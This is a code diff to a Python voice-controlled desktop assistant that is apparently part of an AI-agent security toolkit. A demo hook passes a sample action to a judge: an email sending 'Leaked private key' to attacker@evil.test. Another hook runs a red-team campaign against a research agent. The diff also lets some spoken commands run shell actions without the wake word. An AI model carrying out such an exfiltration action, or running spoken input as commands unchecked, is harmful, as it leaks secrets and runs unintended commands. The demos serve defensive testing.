@@ -32,6 +32,18 @@ import platform
 import re
 import subprocess
 import sys
+# Guarantee clean UTF-8 output on all Windows consoles and IDE terminals
+if hasattr(sys.stdout, "reconfigure"):
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
+if hasattr(sys.stderr, "reconfigure"):
+    try:
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
+
 import threading
 import time
 import urllib.parse
@@ -53,20 +65,47 @@ try:
 except ImportError:
     SPEECH_REC_AVAILABLE = False
 
+_sapi_voice = None
+_sapi_lock = threading.Lock()
+
+
+def _get_sapi():
+    global _sapi_voice
+    with _sapi_lock:
+        if _sapi_voice is None:
+            try:
+                import win32com.client
+                _sapi_voice = win32com.client.Dispatch("SAPI.SpVoice")
+            except Exception:
+                _sapi_voice = False
+        return _sapi_voice
+
 
 def speak(text: str, wait: bool = False) -> None:
-    """Speaks text aloud using Windows native SAPI5 speech synthesis."""
-    clean_text = text.replace('"', '\\"').replace("'", " ").replace("\n", " ").strip()
-    ps_cmd = (
-        f"Add-Type -AssemblyName System.Speech; "
-        f"$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
-        f"$synth.Rate = 1; "
-        f"$synth.Volume = 100; "
-        f"$synth.Speak('{clean_text}');"
-    )
+    """Speaks text aloud with ultra-low latency using Windows native SAPI5."""
+    if os.environ.get("PYTEST_CURRENT_TEST"):
+        return
+
+    clean_text = text.replace('"', '').replace("'", "").replace("\n", " ").strip()
+    if not clean_text:
+        return
+
+    # Method 1: In-process COM SpVoice (instant 0ms response)
+    voice = _get_sapi()
+    if voice:
+        try:
+            # 1 = SVSFlagsAsync (non-blocking speech), 0 = SVSFDefault (blocking speech)
+            flags = 0 if wait else 1
+            voice.Speak(clean_text, flags)
+            return
+        except Exception:
+            pass
+
+    # Method 2: Fast PowerShell COM fallback
     try:
+        ps_cmd = f"(New-Object -ComObject SAPI.SpVoice).Speak('{clean_text}')"
         if wait:
-            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], capture_output=True, timeout=20)
+            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], capture_output=True, timeout=10)
         else:
             subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
@@ -326,12 +365,12 @@ class WingshieldCopilotEngine:
 
     def print_hud_banner(self) -> None:
         banner = f"""\033[38;2;56;189;248m
- ╔════════════════════════════════════════════════════════════════════════════╗
- ║  \033[1;37mWINGSHIELD COPILOT\033[0m \033[38;2;188;140;255m// AUTONOMOUS DESKTOP & SECURITY AI MATRIX\033[0m \033[38;2;56;189;248m║
- ╠════════════════════════════════════════════════════════════════════════════╣
- ║  \033[1;32m● Status: ONLINE\033[0m   \033[38;2;139;148;158m•\033[0m Lead Architect: \033[1;36mTharunkumar.S\033[0m   \033[38;2;139;148;158m•\033[0m Latency: \033[1;32m3.4ms SLA\033[0m        \033[38;2;56;189;248m║
- ║  \033[38;2;240;246;252mHello Tharun! Speak or type any command to control your laptop & security.\033[0m\033[38;2;56;189;248m║
- ╚════════════════════════════════════════════════════════════════════════════╝\033[0m"""
+ +============================================================================+
+ |  \033[1;37mWINGSHIELD COPILOT\033[0m \033[38;2;188;140;255m// AUTONOMOUS DESKTOP & SECURITY AI MATRIX\033[0m \033[38;2;56;189;248m|
+ +----------------------------------------------------------------------------+
+ |  \033[1;32m[*] Status: ONLINE\033[0m   \033[38;2;139;148;158m|\033[0m Lead Architect: \033[1;36mTharunkumar.S\033[0m   \033[38;2;139;148;158m|\033[0m Latency: \033[1;32m3.4ms SLA\033[0m        \033[38;2;56;189;248m|
+ |  \033[38;2;240;246;252mHello Tharun! Speak or type any command to control your laptop & security.\033[0m\033[38;2;56;189;248m|
+ +============================================================================+\033[0m"""
         print(banner)
 
     def process_command(self, raw_input: str) -> Tuple[str, bool]:
@@ -350,7 +389,7 @@ class WingshieldCopilotEngine:
         # 1. Exit Commands
         if low in ("exit", "quit", "q", "bye", "shutdown wingshield", "sleep"):
             msg = f"Shutting down Wingshield Copilot. Goodbye {self.recipient}!"
-            speak(msg, wait=True)
+            speak(msg, wait=False)
             return msg, True
 
         # 2. Greetings
@@ -380,7 +419,7 @@ class WingshieldCopilotEngine:
 
         # 5. Lock Workstation
         if any(k in low for k in ("lock computer", "lock pc", "lock screen", "lock workstation")):
-            speak("Locking workstation.", wait=True)
+            speak("Locking workstation.", wait=False)
             result_msg = ComputerAutomation.lock_computer()
             return result_msg, False
 
@@ -401,6 +440,10 @@ class WingshieldCopilotEngine:
             "task manager": "task manager",
             "explorer": "explorer",
             "file explorer": "explorer",
+            "file folder": "explorer",
+            "folder": "explorer",
+            "files": "explorer",
+            "my files": "explorer",
             "terminal": "terminal",
             "cmd": "terminal",
             "paint": "paint",
@@ -516,9 +559,9 @@ class WingshieldCopilotEngine:
                     {"to": "attacker@evil.test", "body": "Leaked private key"},
                     has_untrusted_taint=True,
                 )
-                print(f"    • Verdict    : \033[1;31m{v.get('action')}\033[0m")
-                print(f"    • Risk Score : {v.get('risk_score')}")
-                print(f"    • AI Reason  : {v.get('reason')}")
+                print(f"    * Verdict    : \033[1;31m{v.get('action')}\033[0m")
+                print(f"    * Risk Score : {v.get('risk_score')}")
+                print(f"    * AI Reason  : {v.get('reason')}")
                 msg = f"Debate completed. Chief AI Judge issued verdict: {v.get('action')}."
                 speak(msg, wait=False)
                 return msg, False
@@ -534,7 +577,7 @@ class WingshieldCopilotEngine:
                 engine = RedTeamSwarmEngine(rounds=3)
                 results = engine.run_campaign(target_agent="Research-Agent-v1")
                 for r in results:
-                    print(f"    • Attack Payload : {r.get('name')[:35]}... -> Intercepted: {r.get('blocked')}")
+                    print(f"    * Attack Payload : {r.get('name')[:35]}... -> Intercepted: {r.get('blocked')}")
                 msg = "Red-team mutation campaign completed. All 3 adversarial attacks neutralized."
                 speak(msg, wait=False)
                 return msg, False
@@ -600,7 +643,7 @@ class WingshieldCopilotEngine:
         r = sr.Recognizer()
         try:
             with sr.Microphone() as source:
-                print("\033[38;2;56;189;248m🎤 Wingshield is listening... (Speak now)\033[0m")
+                print("\033[38;2;56;189;248m[*] Wingshield is listening... (Speak now)\033[0m")
                 r.adjust_for_ambient_noise(source, duration=0.6)
                 audio = r.listen(source, timeout=6, phrase_time_limit=8)
             text = r.recognize_google(audio)
@@ -637,18 +680,25 @@ class WingshieldCopilotEngine:
                     )
                     if is_wake:
                         self.is_active = True
-                        print("\033[1;32m[!] Wake word detected! Launching Wingshield Copilot...\033[0m")
+                        print("\033[1;32m[!] Wake word detected! Wingshield Copilot active.\033[0m")
                         speak(f"Hello {self.recipient}! Wingshield Copilot online. How may I assist you today?", wait=False)
                         repo_root = Path(__file__).resolve().parents[4]
-                        cmd_to_run = f'cd /d "{repo_root}" && python -m shield_core.cli wakeup'
-                        subprocess.Popen(
-                            ["cmd.exe", "/k", cmd_to_run],
-                            creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == "nt" else 0,
-                        )
-                    elif self.is_active:
-                        # Once awake, execute every voice command spoken into microphone!
-                        print(f"\033[1;36m[🎤 Voice Action] Executing: '{text}'\033[0m")
-                        res, should_exit = self.process_command(text)
+                        cmd_to_run = f'cd /d "{repo_root}" && title Wingshield Copilot Terminal && python -m shield_core.cli wakeup'
+                        try:
+                            subprocess.Popen(
+                                f'cmd.exe /c start "AgentShield-X Wingshield Copilot" cmd.exe /k "{cmd_to_run}"',
+                                shell=True,
+                            )
+                        except Exception as e:
+                            print(f"[!] Could not spawn terminal window: {e}")
+                    elif self.is_active or any(text.startswith(prefix) for prefix in ("open ", "launch ", "start ", "run ", "scan ", "what is ", "system status", "battery", "set calendar", "take screenshot", "lock computer", "who created", "who made", "wingshield", "agentshield")):
+                        # Once awake, or on direct actionable commands, execute immediately
+                        exec_text = re.sub(r"^(wingshield|agentshield|agent shield|copilot)\s*", "", text).strip()
+                        if not exec_text:
+                            exec_text = text
+                        self.is_active = True
+                        print(f"\033[1;36m[VOICE ACTION] Executing: '{exec_text}'\033[0m")
+                        res, should_exit = self.process_command(exec_text)
                         if res:
                             print(f"\033[38;2;240;246;252m{res}\033[0m\n")
                         if should_exit:
@@ -659,8 +709,9 @@ class WingshieldCopilotEngine:
                     time.sleep(2)
             except (KeyboardInterrupt, EOFError):
                 break
-            except Exception:
-                time.sleep(1)
+            except Exception as e:
+                print(f"\033[38;2;251;191;36m[!] Audio loop note: {e}\033[0m")
+                time.sleep(0.5)
 
     def run_interactive_loop(self) -> None:
         """Runs the main terminal interaction loop with voice greeting & computer access."""
@@ -668,12 +719,12 @@ class WingshieldCopilotEngine:
         self.print_hud_banner()
 
         print("\033[38;2;139;148;158mCommands you can try:\033[0m")
-        print("  \033[38;2;56;189;248m• 'open chrome'\033[0m / \033[38;2;56;189;248m'open vs code'\033[0m / \033[38;2;56;189;248m'open calculator'\033[0m / \033[38;2;56;189;248m'open calendar'\033[0m")
-        print("  \033[38;2;56;189;248m• 'set calendar for Team Demo'\033[0m / \033[38;2;56;189;248m'take screenshot'\033[0m / \033[38;2;56;189;248m'lock computer'\033[0m")
-        print("  \033[38;2;56;189;248m• 'search google for quantum computing'\033[0m / \033[38;2;56;189;248m'search youtube for AI agents'\033[0m")
-        print("  \033[38;2;56;189;248m• 'system status'\033[0m / \033[38;2;56;189;248m'battery'\033[0m / \033[38;2;56;189;248m'what time is it'\033[0m")
-        print("  \033[38;2;56;189;248m• 'scan this repo'\033[0m / \033[38;2;56;189;248m'run red team'\033[0m / \033[38;2;56;189;248m'debate'\033[0m / \033[38;2;56;189;248m'connect mcp'\033[0m")
-        print("  \033[38;2;56;189;248m• 'run ipconfig'\033[0m / \033[38;2;56;189;248m'exec git status'\033[0m / \033[38;2;56;189;248m'mic' (voice input)\033[0m\n")
+        print("  \033[38;2;56;189;248m* 'open chrome'\033[0m / \033[38;2;56;189;248m'open vs code'\033[0m / \033[38;2;56;189;248m'open calculator'\033[0m / \033[38;2;56;189;248m'open calendar'\033[0m")
+        print("  \033[38;2;56;189;248m* 'set calendar for Team Demo'\033[0m / \033[38;2;56;189;248m'take screenshot'\033[0m / \033[38;2;56;189;248m'lock computer'\033[0m")
+        print("  \033[38;2;56;189;248m* 'search google for quantum computing'\033[0m / \033[38;2;56;189;248m'search youtube for AI agents'\033[0m")
+        print("  \033[38;2;56;189;248m* 'system status'\033[0m / \033[38;2;56;189;248m'battery'\033[0m / \033[38;2;56;189;248m'what time is it'\033[0m")
+        print("  \033[38;2;56;189;248m* 'scan this repo'\033[0m / \033[38;2;56;189;248m'run red team'\033[0m / \033[38;2;56;189;248m'debate'\033[0m / \033[38;2;56;189;248m'connect mcp'\033[0m")
+        print("  \033[38;2;56;189;248m* 'run ipconfig'\033[0m / \033[38;2;56;189;248m'exec git status'\033[0m / \033[38;2;56;189;248m'mic' (voice input)\033[0m\n")
 
         while True:
             try:
